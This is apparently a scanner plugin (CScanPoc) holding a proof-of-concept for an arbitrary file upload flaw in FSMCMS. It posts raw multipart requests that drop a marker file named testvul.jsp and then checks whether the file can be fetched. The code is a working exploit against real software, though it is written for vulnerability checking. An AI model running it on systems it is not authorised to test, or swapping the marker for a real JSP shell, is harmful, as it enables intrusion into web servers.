# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FSMCMS_0011'  # 平台漏洞编号，留空
    name = 'FSMCMS系统 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-10-10'  # 漏洞公布时间
    desc = '''
        北京东方文辉FSMCMS
        /cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=
        /fsm/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=
        /nlw/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=
        页面未做过滤，可任意文件上传。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0144292'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FSMCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e361121b-786e-4c8b-9cb3-007a0c9f80d1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0144292
            hh = hackhttp.hackhttp()
            raw0 = '''
POST /cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=C15EAE8ED9BBC3A9FA18D7D332D83ACF.tomcat1
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------276432152323220
Content-Length: 338

-----------------------------276432152323220
Content-Disposition: form-data; name="Filedata"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_file_upload_test
-----------------------------276432152323220
Content-Disposition: form-data; name="Submit"

ä¸ä¼ 
-----------------------------276432152323220--

    '''
            raw1 = '''
POST /nlw/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------276973178631904
Content-Length: 338

-----------------------------276973178631904
Content-Disposition: form-data; name="Filedata"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_file_upload_test
-----------------------------276973178631904
Content-Disposition: form-data; name="Submit"

ä¸ä¼ 
-----------------------------276973178631904--

    '''

            raw2 = '''
POST /fsm/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=A06E06E2D5DA6A04A699449099594E0C
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------171631986313562
Content-Length: 338

-----------------------------171631986313562
Content-Disposition: form-data; name="Filedata"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_file_upload_test
-----------------------------171631986313562
Content-Disposition: form-data; name="Submit"

ä¸ä¼ 
-----------------------------171631986313562--

'''
            raws = [raw0, raw1, raw2]
            shell_paths = [
                '/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/',
                '/fsm/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/',
                '/nlw/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/'
            ]
            # proxy=('127.0.0.1',1234)
            # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
            for num in range(3):
                url = self.target + shell_paths[num]
                raw = raws[num]
                code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
                # print url
                # print raw
                paths = ['/fsm/app/testvul.jsp',
                         '/app/testvul.jsp', '/nlw/app/testvul.jsp']
                for path in paths:
                    final_shell_path = self.target + path
                    # print final_shell_path
                    code2, head2, res2, errcode2, _url2 = hh.http(
                        final_shell_path)
                    if code2 == 200 and 'testvul_file_upload_test' in res2:
                        # security_hole(final_shell_path)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
